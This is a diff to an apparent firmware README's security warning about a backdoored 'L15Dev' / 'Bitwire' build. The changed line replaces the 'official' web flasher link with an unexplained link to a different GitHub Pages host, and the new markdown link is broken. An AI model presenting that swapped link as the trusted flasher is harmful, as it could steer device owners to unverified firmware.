@@ -3,7 +3,7 @@
 >
 > A firmware build distributed under the name **"L15Dev" / "Bitwire"** has been reported to contain **malware (a virus) and a backdoor**. **Do not download, flash, or run it under any circumstances.**
 >
-> Only use the official builds from this repository / the [web flasher](https://sor3nt.github.io/interface.html). If you already flashed an "L15Dev" image, re-flash a clean official build and treat any credentials/data on the device (WiFi passwords, captures) as compromised.
+> Only use the official builds from this repository / the [web flasher]([https://sor3nt.github.io/interface.html](https://elicoftz.github.io/Momuntum_Flipper_For_T_Embed/flasher.html)). If you already flashed an "L15Dev" image, re-flash a clean official build and treat any credentials/data on the device (WiFi passwords, captures) as compromised.
 
 > WARNING: I do not take responsibility if you damage your board or property. This guide is for educational purposes only — proceed at your own risk.
 
